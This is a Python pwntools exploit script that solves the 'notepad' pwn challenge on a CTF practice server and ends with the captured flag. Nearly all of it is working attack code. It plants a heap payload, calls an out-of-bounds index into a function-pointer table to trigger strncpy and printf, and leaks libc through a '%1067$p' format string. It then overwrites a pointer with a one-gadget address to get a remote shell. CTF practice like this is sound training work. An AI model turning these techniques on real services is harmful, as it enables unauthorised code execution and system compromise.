from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux')
path = '/home/zander/Desktop/ctf/notepad'

elf = ELF(path)
printf_plt_addr = elf.plt['printf']
strncpy_plt_addr = elf.plt['strncpy']
payload = 'a' * 4 + p32(printf_plt_addr) + p32(strncpy_plt_addr) + 'a' * 3
# 0x804c01c -> printf_plt_addr
# 0x804c020 -> strncpy_plt_addr
# io = process(path)
io = remote('hackme.inndy.tw', 7713)

io.recvuntil('::> ')
io.sendline('c')
io.recvuntil('::> ')
io.sendline('a')
io.recvuntil('size > ')
io.sendline('16')
io.recvuntil('data > ')
io.send(payload)
# 0x804B080 char notes[15]  0x804c008(malloc)
# struct {
#   char notepad_show;
#   char notepad_destory;
#   int 1;
#   int size;
#   char data[size];
# }
# x/32xw 0x804c008
io.recvuntil('::> ')
io.sendline('a')
io.recvuntil('size > ')
io.sendline('16')
io.recvuntil('data > ')
io.send('a' * 15)

io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('edit (Y/n)')
io.sendline('Y')
io.recvuntil('content > ')
io.sendline('%1067$p') # 4268| 0xffffd67c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
io.recvuntil('::> ')
io.sendline(p32(93)) # getchar() - 'a'(97) -4 ]
                     # call strncpy
                     # strncpy(16, "%1067$p", &note[1].notepad_show)
io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('::> ') # 这里不返回edit (Y/n)，strncpy破坏if第一个判断条件
io.sendline(p32(92)) # call printf -5 \
                     # printf("%1067$p")
libc_start_main_247 = io.recv().splitlines()[0]
libc_start_main = eval(libc_start_main_247) - 247
print 'libc_start_main: ' + hex(libc_start_main)

libc_base = eval(libc_start_main_247) - 0x18637
print 'libc_base' + hex(libc_base)

MAGIC_addr = 0x3ac3e #libc6_2.23-0ubuntu3_i386.so
MAGIC_addr += libc_base
payload = p32(MAGIC_addr)

io.sendline('b')
io.recvuntil('id > ')
io.sendline('0')
io.recvuntil('edit (Y/n)')
io.sendline('Y')
io.recvuntil('content > ')
io.sendline(payload)
io.recvuntil('::> ')
io.sendline('a')

io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('::> ')
io.sendline(p32(91)) # -6 [

io.interactive()
io.close()

# FLAG{What? A shell from a notepad program? Okey you know what is pwning :)}